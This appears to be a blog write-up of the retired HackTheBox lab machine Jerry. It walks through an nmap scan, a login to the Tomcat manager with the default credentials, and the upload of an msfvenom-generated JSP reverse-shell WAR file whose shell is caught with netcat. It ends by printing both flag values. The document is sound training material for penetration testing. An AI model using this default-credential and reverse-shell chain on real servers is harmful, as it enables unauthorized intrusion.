---
layout: post
title:  "HackTheBox: Jerry" 
description: Write up and complete walkthrough of HackTheBox's Jerry
---

**Overview**

Jerry is a retired HTB easy windows machine. It is running an Apache Tomcat webserver through which we get manager rights using the default credentials. We can then use the manager panel to upload a malicious WAR file containing a reverse shell generated with metasploit. There is no enumeration to be done once on the target machine.

# Enumeration: Initial scan

```terminal
Nmap scan report for 10.10.10.95
Host is up (0.097s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
```

We have only one open port it looks like, on port 8080, running an Apache Tomcat webserver.

# Webserver

If we navigate to `10.10.10.95:8080`, we'll be greeted by tomcat's default landing page. We can navigate to the web application manager section, but this prompts us to input a password and a username. If you neglect to put anything and try to log in, you'll be redirected to an unauthorized page containing some default credentials as examples: `username: tomcat` and `password: s3cret`.


We can use those to login to the manager app and see the some more information.

The first thing we can see is that we have some paths
![Untitled](/assets/20210630150435.png)

None of these links point to anything too interesting, except perhaps the `host-manager` path, but it requires authentication, which we don't seem to have with the default credentials provided by tomcat.

Further down, we can also see that we can deploy files or WAR's to the webserver and also the server information:

- Tomcat Version: `Apache Tomcat/7.0.88`
- JVM Version: `1.8.0_171-b11`
- JVM Vendor: `Oracle Corporation`
- OS Name: `Windows Server 2012 R2`
- OS Version: `6.3`
- OS Architecture `amd64`
- Hostname: `JERRY`
- IP Address: `10.10.10.95`

These could be useful.

# Searching for an exploit

Because most of the tomcat exploits need to have access to the `/manager` page before we can do anything, the process of exploiting the machine becomes more tedious. Thankfully for us, we already have access to the manager dashboard, therefore we can already try to exploit it. The most obvious way would be to try to inject a reverse shell using a malicious WAR file.

The particular payload I used is located on the [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#war) github repo.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war > reverse.war
strings reverse.war | grep jsp # in order to get the name of the file
```

Define the LHOST and the LPORT accordingly to match your machine's IP Address on the HTB network and listener port.

Once the file has been generated, use the `/manager` dashboard to upload it and you should see it pop up in the list of application paths under the name `/reverse` by default. Navigating to `10.10.10.95:8080/reverse` after setting up a listener will trigger a request to your listener and get you a shell:

```terminal
$ nc -lvp 4242
listening on [any] 4242 ...
10.10.10.95: inverse host lookup failed: Host name lookup failure
connect to [10.10.14.11] from (UNKNOWN) [10.10.10.95] 49195
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>
```

We now have a shell.

# Finding the flags

If you dig around a bit and look through the directories, you'll see that there is an administrator user on the machine. You can directly access the contents of the Desktop and find a folder titled `flags` in which you will find both flags:

```cmd
C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
```

We have our two flags!